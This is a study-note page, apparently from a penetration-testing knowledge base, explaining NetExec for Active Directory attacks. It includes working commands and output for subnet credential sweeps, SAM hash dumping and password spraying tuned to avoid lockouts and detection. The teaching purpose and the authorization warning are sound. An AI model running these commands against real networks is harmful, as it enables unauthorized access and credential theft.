---
title: "NetExec"
aliases: ["nxc", "CrackMapExec", "crackmapexec"]
tags: [tree/tooling, cyber/tooling/offensive/ad/netexec, type/tool, difficulty/medium]
Domain: "[[Active Directory & Windows Attack Tools]]"
Color: "#708090"
---

# NetExec

NetExec (`nxc`, the maintained successor to CrackMapExec) is the swiss-army knife for authenticated Active Directory operations. One command sweeps a subnet, tests a credential across every host over SMB/WinRM/LDAP/MSSQL/RDP, and reports where it works and where it grants admin — the fastest way to answer "what does this credential unlock?"

> [!warning] Authorized operations only
> Spraying and mass-authentication can trigger account lockouts — a careless spray is a self-inflicted denial of service. Respect lockout thresholds and scope.

## Parent Learning Order
Impacket -> NetExec -> BloodHound -> Responder

## One credential, checked everywhere at once

NetExec is the **validate & spread** stage — take one credential and find out, fast, everywhere it's good.

The insight it operationalises: in AD, the value of a credential isn't "is it valid?" but "*where* is it valid, and where is it **admin**?" A single local-admin password reused across 200 workstations turns one leaked hash into the whole fleet. NetExec sweeps that question in seconds — one credential against a whole subnet, over the protocol of your choice.

## Pointing it at a range, and reading (Pwned!)

Point it at a range with a credential (password *or* hash — it does pass-the-hash natively):

```shell-session
operator@kali:~$ nxc smb 10.10.20.0/24 -u jdoe -p 'Summer2024'
SMB  10.10.20.10  DC01   [+] corp.local\jdoe:Summer2024
SMB  10.10.20.30  WS30   [+] corp.local\jdoe:Summer2024 (Pwned!)   ← local admin here
operator@kali:~$ nxc smb 10.10.20.30 -u jdoe -p 'Summer2024' --sam
WS30  [+] Dumping SAM hashes
WS30  Administrator:500:aad3b...:1a59b...
```

The `(Pwned!)` marker is the payoff — it means **local admin**, not merely valid. From there, protocol-specific power: `--sam`/`--lsa` (dump creds), `-x '<cmd>'` (run a command), `-M <module>` (spider shares, enumerate, coerce), `--pass-pol` (read the lockout policy *before* you spray).

## Spraying has a direction, and backwards locks the domain

Password spraying has a **direction**, and getting it backwards locks out the domain:

```shell-session
# WRONG — many passwords against ONE user → lockout after 5 tries
operator@kali:~$ nxc smb DC01 -u admin -p passwords.txt
SMB  DC01  [-] corp.local\admin: STATUS_ACCOUNT_LOCKED_OUT   ← you just locked the admin

# RIGHT — ONE password against MANY users → stays under the threshold
operator@kali:~$ nxc smb DC01 -u users.txt -p 'Spring2026!' --continue-on-success
SMB  DC01  [+] corp.local\intern:Spring2026!
SMB  DC01  [+] corp.local\jsmith:Spring2026!
```

**The deliberate break:** the first command is *brute-forcing* — many guesses at one account — and trips the lockout threshold almost immediately, alerting the SOC and denying service. The second is *spraying* — one plausible password (often seasonal, from `--pass-pol`) tried once against every user — which stays under the per-account lockout counter because each account sees only a single failure. Same tool, opposite blast radius. Always read the lockout policy first, cap attempts per account with margin, and pace between rounds. NetExec makes both trivial to run, which is exactly why the discipline is on you.

## Summary

You should now be able to:

- Explain why "where is this credential admin?" is the question NetExec exists to answer.
- Interpret the `(Pwned!)` marker, and dump SAM hashes from a host where you have it.
- Explain why spraying one password across many users is safe but many passwords against one user is not.

---
> 🔼 Up: [[Active Directory & Windows Attack Tools]]
